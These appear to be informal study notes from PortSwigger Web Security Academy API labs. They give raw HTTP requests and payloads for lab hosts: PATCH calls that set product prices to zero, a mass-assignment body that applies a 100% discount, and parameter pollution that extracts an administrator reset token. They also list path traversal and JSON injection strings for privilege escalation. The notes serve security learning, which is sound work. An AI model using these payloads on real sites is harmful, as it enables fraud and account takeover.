PATCH /api/products/1/price HTTP/2        (first find /api endpoint then try OPTION see allow what PATCH,GET,POST,PUT,HEAD?) or u can bruteforce both the method and endpoint

PUT /api/user/delete
PUT /api/user/update
PUT /api/user/create
PUT /api/user/add
PUT /api/user/remove
PUT /api/user/disable
PUT /api/user/enable
PUT /api/user/password
PUT /api/user/profile
PUT /api/user/settings


Host: 0ab9003904b7e3498368507800350075.web-security-academy.net

Cookie: session=BwRdpnXkT5PsrTPSLaGRgyX1GtnAmAah

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json (second saw it show error msg only accept this content-type we add it (rmb no space))

Referer: https://0ab9003904b7e3498368507800350075.web-security-academy.net/product?productId=1

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers 

Content-Length: 15



{"price":0} (last it show server internal error 500 we inject {} below and skip a line with all header content it show error msg price parameter missing we set price to 0 done)

MASS ASSIGMENT VULNERABILITY(developer does not whitelist) u can actualy modify the API JSON



POST /api/checkout HTTP/2

Host: 0adb001104ca2e6b81dab786008f0027.web-security-academy.net

Cookie: session=7tIGt0dlvmseqyg0OTI6NdYqlB3pDV6l

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: https://0adb001104ca2e6b81dab786008f0027.web-security-academy.net/cart

Content-Type: text/plain;charset=UTF-8

Content-Length: 92

Origin: https://0adb001104ca2e6b81dab786008f0027.web-security-academy.net

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers



{"chosen_discount":{"percentage":100},( when i change post to get it show this so i paste to post to set 100perc discount and done)

"chosen_products":[{"product_id":"1","quantity":1}]}


SERVER SIDE PARAMETER POLLUTION
website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, 


Server Side Parameter Pollution
1.Proxy HTTP history sawa .js file go see the response got what 
<img width="691" height="843" alt="image" src="https://github.com/user-attachments/assets/dd6fe8da-7be0-4347-8b4d-4ca97d3e6ba8" />

we found /forgot-password?reset_token=${resetToken}`; the new endpoint that help reset password 

2.At /forgot-password
<img width="408" height="298" alt="image" src="https://github.com/user-attachments/assets/633ba1f3-f4da-4abc-bad5-9d618f0fa65b" />csrf=FrwKpTox9SWCJRaG9ZgCVG7iJ7Tg7NGv&username=administrator# add a # or %23 
it shows field not specified means there is a param called field= 

2.OR u can bruteforce
<img width="395" height="284" alt="image" src="https://github.com/user-attachments/assets/4c8a51a5-1d4f-4469-9f65-60623612e28a" /> since we put an invalid parameter &x=y or %26x=y
u saw the paramter not supported bruteforce the x until sucess in this case field is the correct param
with below wordlist https://github.com/antichown/burp-payloads/blob/master/Server-side%20variable%20names.pay
<img width="395" height="305" alt="image" src="https://github.com/user-attachments/assets/ecebd7ac-4fbf-4363-9892-5283fd02ce36" /> then we bruteforce the field= value isit password,passwd,??? we using POST which send and get json file back


3.remember first step we got the reset_token it might be the param let us try
 <img width="469" height="311" alt="image" src="https://github.com/user-attachments/assets/00f49e7e-4f9f-44e1-b06a-61551dab1756" />it is 3bwxifrxs6peto5p1cy3npoin5cgdleg
change POST to GET as we done the final endpoint  /forgot-password?reset_token=3bwxifrxs6peto5p1cy3npoin5cgdleg

<img width="315" height="34" alt="image" src="https://github.com/user-attachments/assets/154726e9-e8c9-4bc4-b189-0b836381e6d7" />
to
GET to get into the administrator account reset password page
<img width="307" height="39" alt="image" src="https://github.com/user-attachments/assets/da1941a7-82cf-4f21-bcfa-e56472a83a38" />



<img width="734" height="670" alt="image" src="https://github.com/user-attachments/assets/a3a519f4-48f6-4430-b071-1f05b015a1a4" />done


Identify parameters that get placed in URL paths

Inject path traversal sequences:

../ (standard traversal)

..;/ (with semicolon)

..%2f (URL-encoded)

..%252f (double URL-encoded)

Target different resources:

Other users: peter/../otheruser

Admin functions: peter/../admin

Different endpoints: peter/../../api/admin

Example Scenarios
Scenario 1: User Data Access
text
Client: GET /profile?user=carlos
Server: GET /api/users/carlos

Attack: GET /profile?user=carlos%2f..%2fadministrator
Server: GET /api/users/carlos/../administrator
Final: GET /api/users/administrator

# **SSPP in Structured Data - Core Takeaways**

## **The Vulnerability**
**User input gets unsafely inserted into JSON/XML structures** without proper encoding, allowing parameter injection.

## **Two Main Attack Scenarios**

### **1. Form-to-JSON Injection**
```http
POST /update
name=peter","role":"admin

→ Becomes: {"name":"peter","role":"admin"}
```

### **2. JSON-to-JSON Escape Injection**
```http
POST /update
{"name": "peter\",\"role\":\"admin"}

→ Becomes: {"name":"peter","role":"admin"}
```

## **Key Testing Payloads**
```http
# Basic privilege escalation
test","admin":true
test\",\"admin\":true

# Data manipulation  
test","balance":999999
test\",\"balance\":999999

# Response pollution
test","role":"admin  (stores in DB, appears in API responses)
```

## **Critical Finding Patterns**
- **Parameters that appear in API responses**
- **User input used in server-side API calls**
- **JSON/XML construction via string concatenation**

## **Quick Detection**
```python
# Test every user input parameter with:
payloads = ['test","admin":true', 'test\",\"admin\":true']
```

**Bottom Line**: Anytime user input goes into JSON/XML without proper encoding, you can inject parameters and escalate privileges.








